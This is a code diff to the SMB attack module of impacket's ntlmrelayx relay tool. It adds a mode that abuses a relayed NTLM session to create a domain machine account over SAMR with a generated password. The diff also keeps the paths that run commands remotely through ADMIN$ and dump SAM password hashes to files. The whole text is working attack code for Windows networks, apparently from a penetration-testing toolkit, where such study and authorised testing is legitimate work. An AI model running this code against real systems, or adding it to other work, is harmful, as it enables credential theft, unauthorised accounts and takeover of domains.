@@ -24,6 +24,9 @@ from impacket.examples import serviceinstall
 from impacket.smbconnection import SMBConnection
 from impacket.examples.smbclient import MiniImpacketShell
 from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.dcerpc.v5 import samr
+import random
+import string
 
 PROTOCOL_ATTACK_CLASS = "SMBAttack"
 
@@ -81,66 +84,113 @@ class SMBAttack(ProtocolAttack):
                 LOG.info("Service Installed.. CONNECT!")
                 self.installService.uninstall()
         else:
-            from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
-            from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins
-            samHashes = None
-            try:
-                # We have to add some flags just in case the original client did not
-                # Why? needed for avoiding INVALID_PARAMETER
-                if  self.__SMBConnection.getDialect() == smb.SMB_DIALECT:
-                    flags1, flags2 = self.__SMBConnection.getSMBServer().get_flags()
-                    flags2 |= smb.SMB.FLAGS2_LONG_NAMES
-                    self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)
 
-                remoteOps  = RemoteOperations(self.__SMBConnection, False)
-                remoteOps.enableRegistry()
-            except Exception as e:
-                if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
-                    if self.config.enumLocalAdmins:
-                        LOG.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
-                        enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
-                        try:
-                            localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
-                            LOG.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
-                            for name in localAdminNames:
-                                LOG.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))
-                        except DCERPCException:
-                            LOG.info("SAMR access denied")
-                        return
-                # Something else went wrong. aborting
-                LOG.error(str(e))
-                return
+            if (self.config.addComputerSMB is not None):
+                from impacket.examples.secretsdump import RemoteOperations
+                try:
+                    # We have to add some flags just in case the original client did not
+                    # Why? needed for avoiding INVALID_PARAMETER
+                    if  self.__SMBConnection.getDialect() == smb.SMB_DIALECT:
+                        flags1, flags2 = self.__SMBConnection.getSMBServer().get_flags()
+                        flags2 |= smb.SMB.FLAGS2_LONG_NAMES
+                        self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)
 
-            try:
-                remote_host = self.__SMBConnection.getRemoteHost()
-                if self.config.command is not None:
-                    remoteOps._RemoteOperations__executeRemote(self.config.command)
-                    LOG.info("Executed specified command on host: %s", remote_host)
-                    self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
-                    self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
-                    print(self.__answerTMP.decode(self.config.encoding, 'replace'))
-                else:
-                    if not os.path.exists(self.config.lootdir):
-                        os.makedirs(self.config.lootdir)
-                    outfile = os.path.join(self.config.lootdir, remote_host)
-                    bootKey = remoteOps.getBootKey()
-                    remoteOps._RemoteOperations__serviceDeleted = True
-                    samFileName = remoteOps.saveSAM()
-                    samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
-                    samHashes.dump()
-                    samHashes.export(outfile)
-                    LOG.info("Done dumping SAM hashes for host: %s", remote_host)
-                    SECURITYFileName = remoteOps.saveSECURITY()
-                    LSASecrets = LSASecrets(SECURITYFileName, bootKey, remoteOps=remoteOps, isRemote= True, history=False)
-                    LSASecrets.dumpCachedHashes()
-                    LSASecrets.exportCached(outfile)
-                    LSASecrets.dumpSecrets()
-                    LSASecrets.exportSecrets(outfile)
-                    LOG.info("Done dumping LSA hashes for host: %s", remote_host)
-            except Exception as e:
-                LOG.error(str(e))
-            finally:
-                if samHashes is not None:
-                    samHashes.finish()
-                if remoteOps is not None:
-                    remoteOps.finish()
+                    remoteOps  = RemoteOperations(self.__SMBConnection, False)
+                    remoteOps.connectSamr(remoteOps.getMachineNameAndDomain()[1])
+                except Exception as e:
+                    if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
+                        LOG.info("SAMR access denied")
+                    LOG.error(str(e))
+                    return
+
+                LOG.info("Machine account addition via SMB")
+                try:
+                    LOG.info("Target domain SID: " + remoteOps.getDomainSid())
+
+                    if not self.config.addComputerSMB:
+                        computerName = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
+                    else:
+                        computerName = self.config.addComputerSMB[0]
+
+                    createUser = samr.hSamrCreateUser2InDomain(remoteOps.getSamr(), remoteOps.getDomainHandle(), computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE)
+
+                    # Account password setup. In the NTLM relay situation it is not possible to use 'hSamrSetPasswordInternal4New()' because an error for "STATUS_WRONG_PASSWORD" is raised
+                    # For the moment, I'm not sure why this error is raised even with the "USER_FORCE_PASSWORD_CHANGE" access mask during a relay. Probably an encryption issue
+                    # However, with 'hSamrChangePasswordUser()' it seems to work by specifying the "old HashNT" which is the default "blank" password hash
+                    if (not self.config.addComputerSMB or len(self.config.addComputerSMB) < 2):
+                        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
+                    else:
+                        newPassword = self.config.addComputerSMB[1]
+                    try:
+                        userHandle = createUser['UserHandle']
+                        samr.hSamrChangePasswordUser(remoteOps.getSamr(), userHandle, oldPassword='', newPassword=newPassword, oldPwdHashNT="31d6cfe0d16ae931b73c59d7e0c089c0",
+                                                    newPwdHashLM='', newPwdHashNT='')
+                    except Exception as e:
+                        LOG.error("Error with password setup:\n" + str(e))
+
+                    # Still from addComputer.py
+                    checkForUser = samr.hSamrLookupNamesInDomain(remoteOps.getSamr(), remoteOps.getDomainHandle(), [computerName])
+                    userRID = checkForUser['RelativeIds']['Element'][0]
+                    openUser = samr.hSamrOpenUser(remoteOps.getSamr(), remoteOps.getDomainHandle(), samr.MAXIMUM_ALLOWED, userRID)
+                    userHandle = openUser['UserHandle']
+                    req = samr.SAMPR_USER_INFO_BUFFER()
+                    req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
+                    req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
+                    samr.hSamrSetInformationUser2(remoteOps.getSamr(), userHandle, req)
+                    print("Successfully added machine account %s with password %s" % (computerName, newPassword))
+                except Exception as e:
+                    LOG.error(str(e))
+
+            else:
+                from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+                from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins
+                samHashes = None
+                try:
+                    # We have to add some flags just in case the original client did not
+                    # Why? needed for avoiding INVALID_PARAMETER
+                    if  self.__SMBConnection.getDialect() == smb.SMB_DIALECT:
+                        flags1, flags2 = self.__SMBConnection.getSMBServer().get_flags()
+                        flags2 |= smb.SMB.FLAGS2_LONG_NAMES
+                        self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)
+
+                    remoteOps  = RemoteOperations(self.__SMBConnection, False)
+                    remoteOps.enableRegistry()
+                except Exception as e:
+                    if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
+                        if self.config.enumLocalAdmins:
+                            LOG.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
+                            enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
+                            try:
+                                localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
+                                LOG.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
+                                for name in localAdminNames:
+                                    LOG.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))
+                            except DCERPCException:
+                                LOG.info("SAMR access denied")
+                            return
+                    # Something else went wrong. aborting
+                    LOG.error(str(e))
+                    return
+
+                try:
+                    if self.config.command is not None:
+                        remoteOps._RemoteOperations__executeRemote(self.config.command)
+                        LOG.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
+                        self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
+                        self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
+                        print(self.__answerTMP.decode(self.config.encoding, 'replace'))
+                    else:
+                        bootKey = remoteOps.getBootKey()
+                        remoteOps._RemoteOperations__serviceDeleted = True
+                        samFileName = remoteOps.saveSAM()
+                        samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
+                        samHashes.dump()
+                        samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
+                        LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                except Exception as e:
+                    LOG.error(str(e))
+                finally:
+                    if samHashes is not None:
+                        samHashes.finish()
+                    if remoteOps is not None:
+                        remoteOps.finish()
